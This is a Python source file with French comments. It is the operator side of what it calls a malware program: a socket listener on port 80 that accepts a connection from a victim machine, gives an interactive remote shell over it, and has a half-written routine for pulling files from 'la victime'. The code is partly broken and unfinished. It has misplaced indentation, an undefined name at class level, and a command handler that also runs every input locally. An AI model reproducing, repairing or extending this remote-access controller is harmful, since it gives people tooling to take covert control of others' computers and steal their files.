#Importations des librairies

import socket
import os
import subprocess
from time import sleep
import json

# Définition des fonctions
class Shell:
    def __init__(self, SHELL_PYTHON):
        self.SHELL_BT = SHELL_PYTHON

    def verifications(SHELL_PYTHON):
        verifications = ["shell", "exit", "recv_archive", "help","hello"]
        # Pour avoir accès au shell client
        if(SHELL_PYTHON == verifications[0]):
            print("Exécution du shell côté client")
            while True:
                shell = Shell.command()
                if shell == "exit":
                    break  
        # Pour arrêter le malware
        if(SHELL_PYTHON == verifications[1]):
            print("Connexion fermée côté client")
            conn.send("exit".encode())
            conn.close()
            s.close()
            exit()
        # Pour télécharger un fichier du client.
        if(verifications[2] in SHELL_PYTHON):
            print("Téléchargement des fichiers depuis la victime.")
            Shell.recv_archive(SHELL_PYTHON)
        if(not SHELL_PYTHON in verifications):
            if(verifications[2] in SHELL_PYTHON):
                return(" ")
        os.system(SHELL_PYTHON)
        print("\n")
        # Aide sur les commandes possibles
        if(SHELL_PYTHON == verifications[3]):
            print("help")
       #Hello
    if(SHELL_PYTHON == verifications[4]):
        conn.send("hello".encode())
        print("hello sur le client")

    def home():
        conn.send("home".encode())
        HOME = conn.recv(1024).decode("latin1")
        return(HOME)

    def command():
        HOME = Shell.home()
        SHELL = str(input("%s>> "%(HOME)))
        if(SHELL == "exit"):
            SHELL = ""
            return("exit")
        conn.send("command".encode())
        sleep(1)
        conn.send(SHELL.encode())
        print(conn.recv(1024).decode("latin1"))
            
    def recv_archive(filenames):
        conn.send("filesend".encode())
        data1 = conn.recv(1024).decode("latin1")
        print(data1)
        print(conn.recv(1024))

        buffer=1024
        sep="<sep>"


# Gestion des sockets pour la connexion réseau
IP = socket.gethostbyname("localhost")
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, PORT))
s.listen(10)
conn, cliente = s.accept()
welcome = conn.recv(1024)
print(welcome.decode("utf-8"))

while True:
    try:
        shell_btnt = str(input("\033[31m\033[1mKSF\033[31m>>\033[1;32m "))
        Shell.verifications(shell_btnt)
    except KeyboardInterrupt:
        conn.close()
        s.close()
        exit()
